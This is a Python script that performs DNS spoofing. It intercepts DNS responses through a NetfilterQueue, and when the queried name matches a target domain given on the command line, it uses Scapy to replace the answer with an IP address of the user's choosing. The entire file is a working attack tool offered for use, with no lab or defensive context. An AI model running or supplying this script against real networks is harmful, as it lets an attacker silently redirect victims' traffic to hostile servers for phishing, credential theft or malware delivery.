import argparse
import netfilterqueue
from scapy.all import *
from scapy.layers.dns import DNSRR, DNSQR, DNS
from netfilterqueue import NetfilterQueue
from scapy.layers.inet import IP, UDP

# Setup argument parser for target domain and spoofed IP
parser = argparse.ArgumentParser(description="DNS Spoofing with customizable target domain and spoofed IP")
parser.add_argument('-t', '--target', required=True, help="Target domain to spoof, e.g. stackoverflow.com")
parser.add_argument('-i', '--ip', required=True, help="IP address to spoof, e.g. 192.168.1.8")
args = parser.parse_args()

target_domain = args.target.lower()  # Normalize target domain to lowercase
spoof_ip = args.ip  # Spoofed IP address from user input

def process_packet(packet: netfilterqueue.Packet):
    # Convert packet payload to a Scapy packet object
    scapy_packet = IP(packet.get_payload())

    # Check if packet contains a DNS response (DNS Resource Record layer)
    if scapy_packet.haslayer(DNSRR):
        # Extract the queried domain name, decode bytes, strip trailing dot and convert to lowercase
        qname = scapy_packet[DNSQR].qname.decode().rstrip('.').lower()

        # Compare queried domain with target domain to spoof
        if qname == target_domain:
            print(f"[+] Spoofing {qname} to IP {spoof_ip}")

            # Create a fake DNS answer with the spoofed IP address
            answer = DNSRR(rrname=scapy_packet[DNSQR].qname, rdata=spoof_ip)

            # Replace the original DNS answer with our spoofed answer
            scapy_packet[DNS].an = answer

            # Set answer count to 1 since we are spoofing a single answer
            scapy_packet[DNS].ancount = 1

            # Remove length and checksum fields so Scapy recalculates them automatically
            del scapy_packet[IP].len
            del scapy_packet[IP].chksum
            del scapy_packet[UDP].len
            del scapy_packet[UDP].chksum

            # Set the modified packet payload back into the Netfilter queue packet
            packet.set_payload(bytes(scapy_packet))
    else:
        # Print info message for packets without DNS response layer
        print("[*] Packet without DNSRR - ignored")

    # Accept the packet to continue normal processing
    packet.accept()

# Bind the Netfilter queue number 0 to the processing function and start it
queue = NetfilterQueue()
queue.bind(0, process_packet)
print(f"Starting DNS spoofing for target domain: {target_domain} with spoofed IP: {spoof_ip}")
queue.run()
